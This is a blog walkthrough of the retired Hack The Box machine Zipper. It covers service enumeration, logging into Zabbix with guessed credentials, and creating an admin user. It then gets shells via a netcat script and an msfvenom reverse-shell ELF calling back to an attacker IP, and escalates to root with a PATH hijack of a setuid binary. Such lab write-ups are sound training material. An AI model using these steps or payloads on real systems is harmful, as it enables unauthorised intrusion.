---
layout: post
title: "Zipper: Hack The Box Walkthrough"
date: 2019-02-23 15:51:19 +0000
last_modified_at: 2019-02-23 15:51:47 +0000
category: Walkthrough
tags: ["Hack The Box", Zipper, retired]
comments: true
image:
  feature: zipper-htb-walkthrough.jpg
  credit: Uki_71 / Pixabay
  creditlink: https://pixabay.com/en/zip-jeans-clothing-close-up-metal-1686633/
---

This post documents the complete walkthrough of Zipper, a retired vulnerable [VM][1] created by [burmat][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Zipper is retired vulnerable VM from Hack The Box.

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -T5 -oN nmap.txt 10.10.10.108
...
PORT      STATE SERVICE       REASON         VERSION
22/tcp    open  ssh           syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)                 
| ssh-hostkey:
|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
80/tcp    open  http          syn-ack ttl 62 Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10050/tcp open  zabbix-agent? syn-ack ttl 63
```

`nmap` finds `22/tcp` and `80/tcp` open. Nothing unusual. In any case, let's enumerate the `http` service further.

### Directory/File Enumeration

As usual, my first goto tool is `wfuzz`. The wordlist I'm using is SecLists' `quickhits.txt`.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --hc '403,404' http://10.10.10.108/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.108/FUZZ
Total requests: 2371

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

002365:  C=200     31 L      188 W         3105 Ch        "/zabbix/"

Total time: 79.53206
Processed Requests: 2371
Filtered Requests: 2370
Requests/sec.: 29.81187
```

Hmm, interesting. This is how it looks like.

<a class="image-popup">
![688737d1.png](/assets/images/posts/zipper-htb-walkthrough/688737d1.png)
</a>

Hmm. Guest login is allowed.

<a class="image-popup">
![56758d40.png](/assets/images/posts/zipper-htb-walkthrough/56758d40.png)
</a>

I knew I had to try my luck at the login when I saw Zapper's Backup Script.

<a class="image-popup">
![755eae7f.png](/assets/images/posts/zipper-htb-walkthrough/755eae7f.png)
</a>

I tried (`zapper:zapper`).

<a class="image-popup">
![c0c5384c.png](/assets/images/posts/zipper-htb-walkthrough/c0c5384c.png)
</a>

And this is the result.

<a class="image-popup">
![4ee00943.png](/assets/images/posts/zipper-htb-walkthrough/4ee00943.png)
</a>

A quick check with Zabbix 3.0 documentation reveals that GUI access although enabled by default, can be disabled. Alternatively, one can still access the Zabbix server through the web-based application programming interface (or [API](https://www.zabbix.com/documentation/3.0/manual/api)). In fact, the Zabbix CLI Tools [Wiki](https://zabbix.org/wiki/Zabbix_CLI_Tools) provides links to a couple of Zabbix CLI tools that allows us to interact with the Zabbix server through a text-based interface.

I've chosen `zabbix-cli` simply because it's available in the Kali repository. The instructions to install, configure `zabbix-cli` is beyond the scope of this write-up.

<a class="image-popup">
![7ef55747.png](/assets/images/posts/zipper-htb-walkthrough/7ef55747.png)
</a>

Voila. I have access to the Zabbix server.

<a class="image-popup">
![6b6aba6e.png](/assets/images/posts/zipper-htb-walkthrough/6b6aba6e.png)
</a>

I'll create a user and place it at the "Zabbix administrators" user group, where GUI access is allowed.

<a class="image-popup">
![8ab1c558.png](/assets/images/posts/zipper-htb-walkthrough/8ab1c558.png)
</a>

I created a user `ironman` with the password `marvelstud10s`.

<a class="image-popup">
![065bc9a5.png](/assets/images/posts/zipper-htb-walkthrough/065bc9a5.png)
</a>

There you have it. The good thing about Zabbix is the ability to create and run scripts.

<a class="image-popup">
![c901f164.png](/assets/images/posts/zipper-htb-walkthrough/c901f164.png)
</a>

Let's create a reverse shell script with `nc` like so.

<a class="image-popup">
![a3ea4dc4.png](/assets/images/posts/zipper-htb-walkthrough/a3ea4dc4.png)
</a>

The script can be triggered by clicking on any host to bring up the context menu like so.

<a class="image-popup">
![a26f8031.png](/assets/images/posts/zipper-htb-walkthrough/a26f8031.png)
</a>

I have shell. Too bad it's a shell to the Zabbix server container.

<a class="image-popup">
![e4d85da0.png](/assets/images/posts/zipper-htb-walkthrough/e4d85da0.png)
</a>

I wonder what this means.

<a class="image-popup">
![1b94fe82.png](/assets/images/posts/zipper-htb-walkthrough/1b94fe82.png)
</a>

Anyway, I found a `/backups` directory containing two password-protected 7-zip files.

<a class="image-popup">
![7dcee928.png](/assets/images/posts/zipper-htb-walkthrough/7dcee928.png)
</a>

I also found a copy of `backup_script.sh` lying around.

<a class="image-popup">
![ef6a93a3.png](/assets/images/posts/zipper-htb-walkthrough/ef6a93a3.png)
</a>

The password is in `backup_script.sh`!

<a class="image-popup">
![db8e3bd0.png](/assets/images/posts/zipper-htb-walkthrough/db8e3bd0.png)
</a>

Let's keep the password in mind. It might be useful later.

### Low-Privilege Shell

I found the key to getting a low-privilege shell while exploring the Zabbix server. I noticed that there's a host Zipper installed with a Zabbix Agent, and one can create an item to instruct the agent to run system commands like so!

<a class="image-popup">
![f37793ae.png](/assets/images/posts/zipper-htb-walkthrough/f37793ae.png)
</a>

I generated a reverse shell with `msfvenom`. Prior to this, I've experimented with various commands and verified that the host is running 32-bit Ubuntu. Next, to facilitate transfer of the reverse shell, I host the executable with Python's SimpleHTTPServer.

```
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.13.52 LPORT=4321 -f elf -o rev
# python -m SimpleHTTPServer 80
```

The moment I caught the reverse shell, I immediately deleted the item to prevent the command from running again.

<a class="image-popup">
![ae58be7b.png](/assets/images/posts/zipper-htb-walkthrough/ae58be7b.png)
</a>

Let's upgrade the shell to a full TTY since Python 3 is available.

<a class="image-popup">
![c494c229.png](/assets/images/posts/zipper-htb-walkthrough/c494c229.png)
</a>

I'm in Zipper alright! Recall the password earlier? Let's see if we can `su` to `zapper`.

<a class="image-popup">
![22f6a11b.png](/assets/images/posts/zipper-htb-walkthrough/22f6a11b.png)
</a>

Perfect. `user.txt` is in `zapper`'s home directory.

<a class="image-popup">
![10518a8d.png](/assets/images/posts/zipper-htb-walkthrough/10518a8d.png)
</a>

### Privilege Escalation

During enumeration of `zapper`'s account, I notice a `setuid` executable at `/home/zapper/utils`.

<a class="image-popup">
![5450d341.png](/assets/images/posts/zipper-htb-walkthrough/5450d341.png)
</a>

The privilege escalation is pretty straight forward. The executable uses `system(3)` library function to run `systemctl`. It's the classic Linux executable search path attack. Check out the path to `systemctl` and the `$PATH` environment variable.

<a class="image-popup">
![094663d5.png](/assets/images/posts/zipper-htb-walkthrough/094663d5.png)
</a>

The `system(3)` library function essentially searches for `systemctl` in the first path that it finds. What happens if we place a malicious `systemctl` executable in a path we control? Privilege escalation!

Let's write a malicious `systemctl` like so.

<a class="image-popup">
![52c8fe46.png](/assets/images/posts/zipper-htb-walkthrough/52c8fe46.png)
</a>

Compile the code with `gcc` and export `PATH` with `/tmp` as the first path to search.

<a class="image-popup">
![ce130c84.png](/assets/images/posts/zipper-htb-walkthrough/ce130c84.png)
</a>

Executing `zabbix-service` is all that's left to be `root`.

<a class="image-popup">
![4154a6f6.png](/assets/images/posts/zipper-htb-walkthrough/4154a6f6.png)
</a>

Getting `root.txt` is trivial with a `root` shell.

<a class="image-popup">
![6a5f402a.png](/assets/images/posts/zipper-htb-walkthrough/6a5f402a.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/159
[2]: https://www.hackthebox.eu/home/users/profile/1453
[3]: https://www.hackthebox.eu/
